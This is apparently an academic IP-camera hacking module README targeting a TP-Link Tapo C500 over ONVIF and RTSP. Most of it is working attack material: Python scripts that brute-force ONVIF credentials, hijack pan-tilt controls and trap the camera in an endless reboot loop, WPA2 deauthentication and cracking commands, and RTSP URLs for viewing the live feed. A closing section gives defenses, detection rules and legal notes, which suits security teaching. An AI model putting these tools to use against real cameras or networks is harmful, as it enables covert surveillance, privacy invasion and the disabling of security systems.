# 📷 IP Camera Attack Module - ONVIF Protocol Exploitation

**⚠️ EDUCATIONAL USE ONLY - AUTHORIZED TESTING REQUIRED ⚠️**

This module demonstrates security vulnerabilities in IP surveillance cameras through network penetration, credential enumeration, physical manipulation, and denial of service attacks. All experiments were conducted in a controlled laboratory environment on devices owned by the research team.

---

## 📋 Overview

**Target Device:** TP-Link Tapo C500 Wi-Fi Camera  
**Network:** Tenda N300 Wireless Router (WPA2-PSK)  
**Attack Surface:**
- **Port 554:** RTSP (Real-Time Streaming Protocol) - Video streaming
- **Port 2020:** ONVIF (Open Network Video Interface Forum) - Device management
- **Wi-Fi:** 2.4 GHz WPA2 encrypted network

### Critical Security Paradox Discovered

**Unexpected Finding:**
- ✅ **RTSP Port 554** had **strong rate-limiting** → Brute-force resistant
- ❌ **ONVIF Port 2020** had **NO rate-limiting** → Easily compromised

**This contradicts conventional wisdom** that streaming ports are weaker than administrative ports.

---

## 🎯 Vulnerabilities Identified

| Vulnerability | Severity | Port | Impact |
|---------------|----------|------|--------|
| Weak WPA2 Password | 🔴 Critical | - | Network access |
| No ONVIF Rate Limiting | 🔴 Critical | 2020 | Credential enumeration |
| Insufficient Authentication | 🟠 High | 2020 | Unauthorized access |
| Unprotected PTZ API | 🟠 High | 2020 | Physical manipulation |
| Unrestricted Reboot | 🟡 Medium | 2020 | Denial of Service |
| Cleartext RTSP URLs | 🟡 Medium | 554 | Stream compromise |

---

## 📁 File Structure

```
ip-camera-attack/
├── README.md                          # This file
├── Control.py                         # PTZ manipulation tool
├── BrutforcePort2020.py              # ONVIF credential enumeration
├── Reboot.py                         # Continuous reboot DoS
├── requirements.txt                   # Python dependencies
├── wordlists/
│   ├── user.txt                      # Sample usernames
│   └── pass.txt                      # Sample passwords
└── examples/
    ├── network-penetration.md        # WPA2 cracking guide
    ├── onvif-exploitation.md         # ONVIF attack workflow
    ├── ptz-manipulation.md           # Physical control demo
    ├── stream-access.md              # RTSP stream compromise
    └── denial-of-service.md          # DoS attack guide
```

---

## 🔧 Tool Documentation

### 1. Control.py - PTZ Manipulation Tool

**Purpose:** Remote control of Pan-Tilt-Zoom camera movements via ONVIF protocol

**Features:**
- ✓ Pan (horizontal rotation): 340°
- ✓ Tilt (vertical movement): 90°
- ✓ Continuous movement control
- ✓ Configurable speed and duration
- ✓ Multiple movement sequences

**Code Overview:**

```python
#!/usr/bin/env python3
"""
ONVIF PTZ Control Tool
Demonstrates unauthorized camera manipulation
"""

from onvif import ONVIFCamera
import time

# Configuration
YOUR_IP = '192.168.0.100'       # Camera IP
YOUR_PORT = 2020                # ONVIF port
YOUR_USERNAME = 'admin1'        # Compromised credentials
YOUR_PASSWORD = 'password123'   # From brute-force

def move_camera(ptz, move_request, duration_sec):
    """Execute camera movement"""
    print(f"Moving for {duration_sec} second(s)...")
    ptz.ContinuousMove(move_request)
    time.sleep(duration_sec)
    ptz.Stop({'ProfileToken': move_request.ProfileToken})
    print("Move complete.")

def main():
    # Connect to camera
    mycam = ONVIFCamera(YOUR_IP, YOUR_PORT, YOUR_USERNAME, YOUR_PASSWORD)
    
    # Get media profile
    media_service = mycam.create_media_service()
    profiles = media_service.GetProfiles()
    profile_token = profiles[0].token
    
    # Create PTZ service
    ptz_service = mycam.create_ptz_service()
    move_request = ptz_service.create_type('ContinuousMove')
    move_request.ProfileToken = profile_token
    
    # Movement examples
    # Pan Right
    move_request.Velocity = {'PanTilt': {'x': 0.5, 'y': 0}}
    move_camera(ptz_service, move_request, 2)
    
    # Pan Left
    move_request.Velocity = {'PanTilt': {'x': -0.5, 'y': 0}}
    move_camera(ptz_service, move_request, 2)
    
    # Tilt Up
    move_request.Velocity = {'PanTilt': {'x': 0, 'y': 0.5}}
    move_camera(ptz_service, move_request, 1)
    
    # Tilt Down
    move_request.Velocity = {'PanTilt': {'x': 0, 'y': -0.5}}
    move_camera(ptz_service, move_request, 1)
```

**Velocity Parameters:**
```python
# Pan/Tilt values range from -1.0 to 1.0
{'PanTilt': {'x': X_VALUE, 'y': Y_VALUE}}

# Pan (X-axis):
#   -1.0 = Full speed left
#    0.0 = No pan movement
#   +1.0 = Full speed right

# Tilt (Y-axis):
#   -1.0 = Full speed down
#    0.0 = No tilt movement
#   +1.0 = Full speed up
```

**Usage:**
```bash
# Configure credentials in script
nano Control.py

# Execute
python3 Control.py
```

**Expected Output:**
```
Connected to camera.
Moving RIGHT...
Moving for 2 second(s)...
Move complete.
Moving LEFT...
Moving for 2 second(s)...
Move complete.
All moves finished.
```

---

### 2. BrutforcePort2020.py - ONVIF Credential Enumeration

**Purpose:** Dictionary-based brute-force attack on ONVIF administrative interface

**Features:**
- ✓ Wordlist-based username/password testing
- ✓ Automatic reboot on successful authentication
- ✓ Progress monitoring
- ✓ Credential discovery logging

**Attack Strategy:**

```
For each username in user.txt:
    For each password in pass.txt:
        Try ONVIF authentication
        If successful:
            Execute SystemReboot() command
            Log credentials
            Exit
```

**Code Overview:**

```python
#!/usr/bin/env python3
"""
ONVIF Brute Force Tool
Tests credentials and executes payload on success
"""

from onvif import ONVIFCamera
import sys

# Configuration
YOUR_IP = '192.168.0.100'
YOUR_PORT = 2020
USER_FILE = 'user.txt'
PASS_FILE = 'pass.txt'

def try_reboot(ip, port, username, password):
    """
    Test credentials and reboot on success
    Returns True if successful, False otherwise
    """
    try:
        print(f"[*] Trying: {username}:{password}")
        mycam = ONVIFCamera(ip, port, username, password)
        
        # Connection successful
        print(f"\n[+] SUCCESS! Valid credentials: {username}:{password}\n")
        
        # Execute payload
        device_service = mycam.create_devicemgmt_service()
        print("--- Sending REBOOT command ---")
        device_service.SystemReboot()
        print("Reboot command sent successfully.")
        
        return True
        
    except Exception as e:
        print(f"[-] FAILED: {str(e)}\n")
        return False

def main():
    # Load wordlists
    with open(USER_FILE, 'r') as f:
        users = [line.strip() for line in f.readlines()]
    
    with open(PASS_FILE, 'r') as f:
        passwords = [line.strip() for line in f.readlines()]
    
    print(f"[*] Testing {len(users)} users × {len(passwords)} passwords")
    print(f"[*] Total combinations: {len(users) * len(passwords)}")
    print(f"--- Starting attack on {YOUR_IP} ---\n")
    
    # Brute force
    for user in users:
        for pwd in passwords:
            if try_reboot(YOUR_IP, YOUR_PORT, user, pwd):
                print("--- Task complete. Valid credentials found. ---")
                return
    
    print("--- All combinations failed. ---")

if __name__ == '__main__':
    main()
```

**Wordlist Setup:**

**user.txt:**
```
admin
admin1
administrator
root
user
support
guest
```

**pass.txt:**
```
admin
password
password123
12345678
admin123
camera
tapo2023
```

**Usage:**
```bash
# Create wordlists
nano wordlists/user.txt
nano wordlists/pass.txt

# Configure script
nano BrutforcePort2020.py

# Execute attack
python3 BrutforcePort2020.py
```

**Expected Output (Success):**
```
[*] Testing 7 users × 7 passwords
[*] Total combinations: 49
--- Starting attack on 192.168.0.100 ---

[*] Trying: admin:admin
[-] FAILED: [Errno 111] Connection refused

[*] Trying: admin:password
[-] FAILED: 401 Client Error: Unauthorized

[*] Trying: admin1:password123

[+] SUCCESS! Valid credentials: admin1:password123

--- Sending REBOOT command ---
Reboot command sent successfully.
--- Task complete. Valid credentials found. ---
```

---

### 3. Reboot.py - Continuous Reboot DoS

**Purpose:** Denial of Service attack through infinite reboot loop

**Features:**
- ✓ Continuous reboot loop
- ✓ Connection retry logic
- ✓ Automatic reconnection handling
- ✓ Graceful shutdown (Ctrl+C)

**Attack Mechanism:**

```
Loop indefinitely:
    1. Connect to camera
    2. Send SystemReboot() command
    3. Wait 25 seconds (for reboot cycle)
    4. Reconnect when camera comes online
    5. Repeat
```

**Code Overview:**

```python
#!/usr/bin/env python3
"""
Continuous Reboot DoS Tool
Keeps camera in perpetual reboot state
"""

import time
import sys
from onvif import ONVIFCamera

# Configuration
YOUR_IP = '192.168.0.100'
YOUR_PORT = 2020
YOUR_USERNAME = 'admin1'
YOUR_PASSWORD = 'password123'

def main():
    print("--- Starting continuous reboot loop ---")
    print("Press Ctrl+C to stop the script.")
    
    while True:
        try:
            # Attempt connection
            print(f"Attempting to connect to {YOUR_IP}...")
            mycam = ONVIFCamera(YOUR_IP, YOUR_PORT, YOUR_USERNAME, YOUR_PASSWORD)
            print("Connection successful.")
            
            # Send reboot command
            device_service = mycam.create_devicemgmt_service()
            print("--- Sending REBOOT command NOW ---")
            device_service.SystemReboot()
            
            # Wait for reboot cycle
            print("Reboot command sent. Waiting 25 seconds for camera to cycle...")
            time.sleep(25)
            
        except KeyboardInterrupt:
            print("\nStopping loop. Camera will now reboot normally.")
            sys.exit(0)
            
        except Exception as e:
            print(f"Connection failed (camera is likely rebooting): {e}")
            time.sleep(10)  # Wait before retry

if __name__ == '__main__':
    main()
```

**Usage:**
```bash
# Configure credentials
nano Reboot.py

# Launch attack
python3 Reboot.py

# Stop attack (in terminal)
Press Ctrl+C
```

**Expected Output:**
```
--- Starting continuous reboot loop ---
Press Ctrl+C to stop the script.

Attempting to connect to 192.168.0.100...
Connection successful.
--- Sending REBOOT command NOW ---
Reboot command sent. Waiting 25 seconds for camera to cycle...

Attempting to connect to 192.168.0.100...
Connection failed (camera is likely rebooting): [Errno 111] Connection refused
Connection failed (camera is likely rebooting): [Errno 111] Connection refused

Attempting to connect to 192.168.0.100...
Connection successful.
--- Sending REBOOT command NOW ---
...
```

**Impact:**
- Camera never completes boot sequence
- Surveillance function completely disabled
- No video recording
- System appears "broken" to user

---

## 🔬 Complete Attack Workflow

### Phase 1: Network Penetration

**Objective:** Gain access to camera's network

#### Step 1: Wireless Reconnaissance

```bash
# Enable monitor mode
sudo airmon-ng check kill
sudo airmon-ng start wlan0

# Scan for target network
sudo airodump-ng wlan0mon
```

**Identify:**
- SSID: Tenda_E47AC8
- BSSID: [ROUTER_MAC]
- Channel: 11

---

#### Step 2: WPA2 Handshake Capture

```bash
# Targeted capture
sudo airodump-ng -c 11 --bssid [ROUTER_MAC] -w capture wlan0mon
```

**In another terminal:**
```bash
# Deauthentication to force handshake
sudo aireplay-ng --deauth 10 -a [ROUTER_MAC] wlan0mon
```

**Verify capture:**
```bash
# Open in Wireshark
wireshark capture-01.cap

# Apply filter
eapol
```

**Look for:** Message 1/4, 2/4, 3/4, 4/4 sequence

---

#### Step 3: Password Cracking

```bash
# Brute force with wordlist
sudo aircrack-ng -w pass.txt capture-01.cap
```

**Expected Output:**
```
Aircrack-ng 1.6

[00:00:15] 1247/2876 keys tested (83.12 k/s)

KEY FOUND! [ Mohammed1234 ]

Master Key     : 5F 3B 89 2A ...
Transient Key  : 7D 4E 91 6C ...
```

---

#### Step 4: Network Access

```bash
# Connect to network
nmcli dev wifi connect "Tenda_E47AC8" password "Mohammed1234"

# Verify connection
ifconfig
```

---

### Phase 2: Service Discovery

#### Step 5: Network Scanning

```bash
# Discover camera
sudo nmap -sn 192.168.0.0/24
```

**Output:**
```
Nmap scan report for 192.168.0.100
Host is up (0.0023s latency).
MAC Address: AA:BB:CC:DD:EE:FF (TP-Link)
```

---

#### Step 6: Service Enumeration

```bash
# Port scan
sudo nmap -sV -p- 192.168.0.100
```

**Output:**
```
PORT     STATE SERVICE    VERSION
554/tcp  open  rtsp       RTSP server (TP-Link IP Camera)
2020/tcp open  onvif      ONVIF Device Management
8800/tcp open  http       Tapo Camera Web Interface
```

---

### Phase 3: Initial Attack Attempt (RTSP)

#### Step 7: RTSP Brute Force (FAILED)

```bash
# Attempt Hydra brute force
hydra -L user.txt -P pass.txt rtsp://192.168.0.100
```

**Output:**
```
[ERROR] unknown authentication protocol
[ERROR] repeated connection failures
```

**Finding:** RTSP port has strong rate-limiting protection

---

### Phase 4: ONVIF Exploitation

#### Step 8: ONVIF Brute Force (SUCCESS)

```bash
# Custom Python script
python3 BrutforcePort2020.py
```

**Output:**
```
[*] Trying: admin1:password123
[+] SUCCESS! Valid credentials found: admin1:password123
--- Sending REBOOT command ---
```

**Key Discovery:** ONVIF port lacks rate-limiting

---

### Phase 5: Stream Access

#### Step 9: RTSP Stream Compromise

```bash
# Access live stream with discovered credentials
ffplay rtsp://admin1:password123@192.168.0.100:554/stream1
```

**Result:** Live video feed displayed

**Alternative tools:**
```bash
# VLC Media Player
vlc rtsp://admin1:password123@192.168.0.100:554/stream1

# OpenCV (Python)
import cv2
cap = cv2.VideoCapture("rtsp://admin1:password123@192.168.0.100:554/stream1")
```

---

### Phase 6: Physical Manipulation

#### Step 10: PTZ Control

```bash
python3 Control.py
```

**Executed Movements:**
- Pan right 2 seconds
- Pan left 2 seconds
- Tilt up 1 second
- Tilt down 1 second

**Impact:** Complete control over camera's physical orientation

---

### Phase 7: Denial of Service

#### Step 11: Continuous Reboot Attack

```bash
python3 Reboot.py
```

**Result:**
- Camera enters infinite reboot loop
- Surveillance function disabled
- System rendered unusable

---

## 📊 Attack Success Metrics

### Credential Enumeration

| Metric | Value |
|--------|-------|
| Total attempts | 49 combinations |
| Time to success | ~2 minutes |
| Success rate | 100% (weak password) |
| Rate limit encountered | None |

### Security Paradox Analysis

| Port | Service | Rate Limiting | Brute-force Result |
|------|---------|---------------|-------------------|
| 554 | RTSP | ✅ Strong | ❌ Failed |
| 2020 | ONVIF | ❌ None | ✅ Success |

**Conclusion:** Administrative port is MORE vulnerable than streaming port

---

## 🛡️ Defense Recommendations

### For Camera Owners

**Immediate Actions:**

1. **Change Default Credentials**
```
✓ Use 16+ character passwords
✓ Include uppercase, lowercase, numbers, symbols
✓ Avoid dictionary words
✓ Example: aB9#mK2$pL7@qR5!
```

2. **Disable ONVIF if Unused**
```
Camera Settings → Network → ONVIF
☐ Disable ONVIF Protocol
```

3. **Update Firmware**
```
Settings → System → Firmware Update
✓ Check for latest version
✓ Enable automatic updates
```

4. **Network Segmentation**
```
Create dedicated IoT VLAN:
- Main Network: 192.168.1.0/24
- IoT VLAN: 192.168.10.0/24
- Block inter-VLAN communication
```

5. **Monitor Access Logs**
```
Settings → System → Logs
✓ Enable logging
✓ Review authentication attempts
✓ Alert on failures
```

---

### For Manufacturers

**Critical Fixes:**

1. **Implement Rate Limiting on ALL Ports**
```python
# Example: 3 failed attempts = 5 minute lockout
failed_attempts = {}

def check_rate_limit(ip_address):
    if ip_address in failed_attempts:
        attempts, last_time = failed_attempts[ip_address]
        if attempts >= 3 and (time.time() - last_time) < 300:
            return False  # Blocked
    return True  # Allowed
```

2. **Enforce Strong Password Policy**
```
Minimum requirements:
✓ 12+ characters
✓ Mixed case
✓ Numbers
✓ Special characters
✓ Not in breach database
```

3. **Add Two-Factor Authentication**
```
ONVIF + TOTP:
1. Username/password
2. Time-based one-time password
3. Both required for access
```

4. **Implement Certificate-Based Auth**
```
Replace password auth with:
- Client certificates
- Mutual TLS (mTLS)
- Public key infrastructure (PKI)
```

5. **Audit Logging**
```
Log all ONVIF operations:
- Authentication attempts
- PTZ commands
- Configuration changes
- Reboot requests
```

---

### For Network Administrators

**Infrastructure Protection:**

1. **VLAN Segmentation**
```bash
# Cisco switch configuration
vlan 10
  name IoT_Cameras
  
interface GigabitEthernet1/0/1
  switchport mode access
  switchport access vlan 10
  
# Block inter-VLAN routing
access-list 100 deny ip 192.168.10.0 0.0.0.255 192.168.1.0 0.0.0.255
access-list 100 permit ip any any
```

2. **Firewall Rules**
```bash
# iptables rules
# Only allow specific management station
iptables -A INPUT -p tcp --dport 2020 -s 192.168.1.10 -j ACCEPT
iptables -A INPUT -p tcp --dport 2020 -j DROP

# Only allow viewing from trusted IPs
iptables -A INPUT -p tcp --dport 554 -s 192.168.1.0/24 -j ACCEPT
iptables -A INPUT -p tcp --dport 554 -j DROP
```

3. **Intrusion Detection**
```bash
# Snort rule for ONVIF brute force
alert tcp any any -> $HOME_NET 2020 (msg:"Possible ONVIF brute force"; \
    flags:S; threshold: type threshold, track by_src, count 5, seconds 60; \
    classtype:attempted-admin; sid:1000001;)
```

4. **VPN Access Only**
```
Camera access requires:
1. VPN connection to trusted network
2. Then access camera IP
3. All traffic encrypted in VPN tunnel
```

---

## 🔍 Detection Methods

### Network-Level Detection

```bash
# Monitor authentication attempts
sudo tcpdump -i eth0 -nn 'tcp port 2020' | grep -i auth

# Detect rapid connection attempts
sudo iftop -i eth0 -f "port 2020"
```

### Camera-Level Detection

**Check logs for suspicious activity:**
```
Settings → System → Security Logs

Look for:
- Multiple failed login attempts
- Repeated reboots
- Unauthorized PTZ movements
- Unknown IP addresses
```

### Automated Monitoring Script

```python
#!/usr/bin/env python3
"""
Camera Security Monitor
Alerts on suspicious activity
"""

import subprocess
import time
import smtplib

CAMERA_IP = "192.168.0.100"
CHECK_INTERVAL = 30  # seconds
ALERT_EMAIL = "admin@example.com"

def check_camera_status():
    """Ping camera to verify it's online"""
    result = subprocess.call(['ping', '-c', '1', '-W', '1', CAMERA_IP],
                           stdout=subprocess.DEVNULL)
    return result == 0

def check_reboot_loop():
    """Detect continuous reboot attacks"""
    offline_count = 0
    
    for _ in range(5):
        if not check_camera_status():
            offline_count += 1
        time.sleep(10)
    
    return offline_count >= 3

def send_alert(message):
    """Send email alert"""
    # Configure your SMTP settings
    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login("alert@example.com", "password")
    server.sendmail("alert@example.com", ALERT_EMAIL, message)
    server.quit()

print("[*] Starting camera security monitor...")

while True:
    if check_reboot_loop():
        print("[!!!] ATTACK DETECTED: Camera in reboot loop!")
        send_alert("ALERT: Camera under DoS attack!")
    
    time.sleep(CHECK_INTERVAL)
```

---

## 📚 ONVIF Protocol Reference

### Common ONVIF Services

| Service | Port | Purpose |
|---------|------|---------|
| Device Management | 2020 | System control, reboot |
| Media | 2020 | Stream configuration |
| PTZ | 2020 | Camera movement |
| Imaging | 2020 | Image settings |
| Analytics | 2020 | Motion detection |

### Key ONVIF Commands

```python
# Device Management
device_service.SystemReboot()          # Reboot camera
device_service.GetDeviceInformation()  # Get device info
device_service.SetSystemDateAndTime()  # Change time

# PTZ Control
ptz_service.ContinuousMove()           # Start movement
ptz_service.Stop()                     # Stop movement
ptz_service.GetStatus()                # Get position

# Media Service
media_service.GetProfiles()            # Get stream profiles
media_service.GetStreamUri()           # Get RTSP URL
```

---

## ⚖️ Legal Considerations

### Applicable Laws

**Computer Fraud and Abuse Act (18 U.S.C. § 1030)**
- Unauthorized access to protected computers
- Penalties: Up to 20 years imprisonment

**Wiretap Act (18 U.S.C. § 2511)**
- Interception of video communications
- Penalties: Up to 5 years imprisonment

**State Laws**
- Computer trespass
- Voyeurism statutes
- Privacy violations

### Legal Use Cases

**✅ Authorized:**
- Testing your own cameras
- Penetration testing with written contract
- Security research in lab environment
- Vendor security assessments
- Academic research with proper approval

**❌ Unauthorized:**
- Accessing cameras you don't own
- Viewing private spaces without consent
- Disrupting surveillance systems
- Corporate espionage
- Any malicious use

---

## 🎓 Learning Outcomes

After completing this module, you understand:

- ✓ WPA2 handshake capture and cracking
- ✓ ONVIF protocol structure and vulnerabilities
- ✓ Credential enumeration techniques
- ✓ Rate-limiting importance and implementation
- ✓ PTZ control exploitation
- ✓ Denial of Service attack mechanisms
- ✓ Defense strategies and best practices

---

## 🔗 Related Resources

### Tools Used
- **Aircrack-ng Suite** - Wireless auditing
- **Nmap** - Network discovery
- **Wireshark** - Packet analysis
- **python-onvif-zeep** - ONVIF library
- **FFmpeg/FFplay** - Stream viewing

### Further Reading
- ONVIF Core Specification 2.0
- RFC 2326 - RTSP Protocol
- OWASP IoT Top 10
- NIST Cybersecurity Framework

---

## 📝 Changelog

**v1.0.0** - Initial Release
- WPA2 penetration workflow
- ONVIF brute-force tool
- PTZ manipulation script
- Continuous reboot DoS
- Complete documentation

---

## 👥 Credits

**Research Team:**
- Meshari Alqahtani
- Hussam Almuqbil
- Mohammed Alyami
- Mohammed Almuhaini

**Project:** IoT & Wireless Security Penetration Testing  
**Institution:** Academic Research  
**Date:** December 2024

---

## 📞 Contact

**For educational or security research inquiries:**
- Contact through academic channels only
- Responsible disclosure welcomed
- No support for unauthorized use

---

**⚠️ SECURITY PARADOX REMINDER:**

Our research revealed that the **administrative ONVIF port (2020) was MORE vulnerable** than the **streaming RTSP port (554)**. This highlights the importance of:

1. Testing ALL attack surfaces, not just obvious ones
2. Implementing rate-limiting on EVERY exposed port
3. Not assuming administrative interfaces are secure
4. Regular security audits of ALL services

**Stay Secure. Stay Vigilant. Stay Ethical.** 🔐📹
